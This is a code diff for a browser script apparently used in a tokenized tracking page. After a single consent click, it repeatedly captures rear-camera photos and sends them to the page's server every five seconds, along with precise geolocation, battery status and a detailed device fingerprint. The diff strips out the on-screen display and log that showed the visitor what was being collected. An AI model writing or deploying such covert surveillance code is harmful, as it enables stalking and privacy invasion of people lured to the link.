@@ -5,11 +5,6 @@
   const overlay = document.getElementById("consentOverlay");
 
   const video = document.getElementById("video");
-  const batteryEl = document.getElementById("battery");
-  const ipEl = document.getElementById("ip");
-  const coordsEl = document.getElementById("coords");
-  const logEl = document.getElementById("log");
-
   const token = TOKEN;
   const captureMs = 5000;
 
@@ -19,200 +14,153 @@
   const canvas = document.createElement("canvas");
   const ctx = canvas.getContext("2d");
 
-  function log(...args) {
-    if (!logEl) return;
-    logEl.textContent =
-      `${new Date().toLocaleTimeString()} — ${args.join(" ")}\n` +
-      logEl.textContent;
-  }
+  // collect "static" device info
+  async function collectDeviceDetails() {
+    const ua = navigator.userAgent || "";
+    const platform = navigator.platform || null;
+    const cpu = navigator.hardwareConcurrency || null;
+    const ram = navigator.deviceMemory || null;
+    const langs = navigator.languages || [navigator.language];
 
-  function json(o) {
-    return JSON.stringify(o);
-  }
-
-  async function fetchIp() {
+    let tz = null;
     try {
-      const res = await fetch(`/upload_info/${token}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: json({ battery: null, coords: null })
-      });
-      const j = await res.json();
-      if (ipEl) ipEl.textContent = (j.stored && j.stored.ip) || "unknown";
-      log("IP stored:", (j.stored && j.stored.ip) || "unknown");
-    } catch (e) {
-      log("IP fetch error", e);
-    }
-  }
+      tz = {
+        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset: new Date().getTimezoneOffset()
+      };
+    } catch (_) {}
 
-  async function sendInfo(battery, coords) {
-    try {
-      await fetch(`/upload_info/${token}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: json({ battery, coords })
-      });
-    } catch (e) {
-      log("sendInfo error", e);
-    }
-  }
+    const scr = {
+      w: screen.width,
+      h: screen.height,
+      ratio: window.devicePixelRatio || 1,
+    };
 
-  function waitForVideoReady(maxWaitMs = 3000) {
-    return new Promise((resolve) => {
-      if (video.videoWidth > 0 && video.videoHeight > 0) {
-        return resolve(true);
+    const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const net = n ? {
+      type: n.effectiveType,
+      downlink: n.downlink,
+      rtt: n.rtt,
+      saveData: n.saveData
+    } : null;
+
+    // permission states
+    let perms = {};
+    if (navigator.permissions) {
+      for (const name of ["geolocation", "camera"]) {
+        try {
+          const s = await navigator.permissions.query({ name });
+          perms[name] = s.state;
+        } catch (_) {}
       }
-      let done = false;
-
-      function onReady() {
-        if (!done && video.videoWidth > 0 && video.videoHeight > 0) {
-          done = true;
-          cleanup();
-          resolve(true);
-        }
-      }
-
-      function cleanup() {
-        video.removeEventListener("loadedmetadata", onReady);
-        video.removeEventListener("canplay", onReady);
-      }
-
-      video.addEventListener("loadedmetadata", onReady);
-      video.addEventListener("canplay", onReady);
-
-      setTimeout(() => {
-        if (!done) {
-          done = true;
-          cleanup();
-          resolve(false);
-        }
-      }, maxWaitMs);
-    });
-  }
-
-  async function captureAndUpload() {
-    if (!stream) return;
-    if (!video.videoWidth || !video.videoHeight) {
-      log("Video frame not ready, skipping capture");
-      return;
     }
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
-    log("Captured frame, dataUrl length:", dataUrl.length);
-
-    try {
-      const res = await fetch(`/upload_image/${token}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: json({ image_b64: dataUrl })
-      });
-      const j = await res.json();
-      if (j && j.filename) {
-        log("Uploaded image:", j.filename);
-      } else {
-        log("Image upload response without filename");
-      }
-    } catch (e) {
-      log("Image upload failed", e);
-    }
+    return {
+      userAgent: ua,
+      platform,
+      cpuCores: cpu,
+      ramGB: ram,
+      languages: langs,
+      tz,
+      screen: scr,
+      network: net,
+      permissions: perms,
+    };
   }
 
   async function readBattery() {
     try {
-      if (navigator.getBattery) {
-        const bat = await navigator.getBattery();
-        const info = {
-          level: Math.round(bat.level * 100),  // 0–100
-          charging: bat.charging
-        };
-        if (batteryEl) {
-          batteryEl.textContent = `${info.level}% ${
-            info.charging ? "(charging)" : ""
-          }`;
-        }
-        return info;
-      } else {
-        if (batteryEl) batteryEl.textContent = "unsupported";
-        return null;
-      }
-    } catch (e) {
-      if (batteryEl) batteryEl.textContent = "error";
+      if (!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return { level: Math.round(b.level * 100), charging: b.charging };
+    } catch (_) {
       return null;
     }
   }
 
   async function getLocation() {
     return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        if (coordsEl) coordsEl.textContent = "unsupported";
-        resolve(null);
-        return;
-      }
+      if (!navigator.geolocation) return resolve(null);
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const coords = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: pos.coords.accuracy
-          };
-          if (coordsEl) {
-            coordsEl.textContent = `${coords.lat.toFixed(
-              6
-            )}, ${coords.lon.toFixed(6)} (±${coords.acc}m)`;
-          }
-          resolve(coords);
-        },
-        () => {
-          if (coordsEl) coordsEl.textContent = "denied";
-          resolve(null);
-        },
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy
+        }),
+        () => resolve(null),
         { enableHighAccuracy: true, maximumAge: 20000 }
       );
     });
   }
 
+  function waitForVideoReady(timeout = 3000) {
+    return new Promise((resolve) => {
+      if (video.videoWidth > 0) return resolve(true);
+      let done = false;
+      function ok() {
+        if (!done && video.videoWidth > 0) {
+          done = true;
+          cleanup();
+          resolve(true);
+        }
+      }
+      function cleanup() {
+        video.removeEventListener("loadedmetadata", ok);
+        video.removeEventListener("canplay", ok);
+      }
+      video.addEventListener("loadedmetadata", ok);
+      video.addEventListener("canplay", ok);
+      setTimeout(() => { if (!done) { done = true; cleanup(); resolve(false); } }, timeout);
+    });
+  }
+
+  async function uploadFrame() {
+    if (!stream) return;
+
+    if (!video.videoWidth || !video.videoHeight) return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
+
+    await fetch(`/upload_image/${token}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image_b64: dataUrl })
+    });
+  }
+
+  async function uploadInfo() {
+    const battery = await readBattery();
+    const coords = await getLocation();
+    const details = await collectDeviceDetails();
+
+    await fetch(`/upload_info/${token}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ battery, coords, details })
+    });
+  }
+
   async function startSession() {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "environment" },
-        audio: false
-      });
-      video.srcObject = stream;
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment" },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+    await waitForVideoReady(4000);
 
-      try {
-        await video.play();
-      } catch (_) {
-        // ignore
-      }
+    // First info + first photo immediately
+    await uploadInfo();
+    await uploadFrame();
 
-      const ready = await waitForVideoReady(4000);
-      if (ready) {
-        log("Video ready:", video.videoWidth + "x" + video.videoHeight);
-      } else {
-        log("Video not ready, captures may be skipped");
-      }
-
-      log("Camera streaming started");
-
-      await fetchIp();
-      const battery = await readBattery();
-      const coords = await getLocation();
-      await sendInfo(battery, coords);
-      log("Initial info sent");
-
-      captureInterval = setInterval(async () => {
-        const b = await readBattery();
-        const c = await getLocation();
-        await sendInfo(b, c);
-        await captureAndUpload();
-      }, captureMs);
-    } catch (e) {
-      log("Start failed:", e);
-    }
+    // then every 5 sec
+    captureInterval = setInterval(async () => {
+      await uploadInfo();
+      await uploadFrame();
+    }, captureMs);
   }
 
   function stopSession() {
@@ -220,32 +168,20 @@
     captureInterval = null;
 
     if (stream) {
-      try {
-        for (const t of stream.getTracks()) t.stop();
-      } catch (_) {}
+      for (const t of stream.getTracks()) t.stop();
       stream = null;
       video.srcObject = null;
     }
-    log("Session stopped");
   }
 
-  // Popup buttons
-  if (allowBtn && overlay) {
-    allowBtn.addEventListener("click", () => {
-      overlay.style.display = "none";
-      startSession();
-    });
-  }
-
-  if (denyBtn && overlay) {
-    denyBtn.addEventListener("click", () => {
-      overlay.style.display = "none";
-      // user denied, do nothing else
-      log("User denied permissions");
-    });
-  }
-
-  window.addEventListener("beforeunload", () => {
-    stopSession();
+  allowBtn.addEventListener("click", async () => {
+    overlay.style.display = "none";
+    startSession();
   });
+
+  denyBtn.addEventListener("click", () => {
+    overlay.style.display = "none";
+  });
+
+  window.addEventListener("beforeunload", stopSession);
 })();
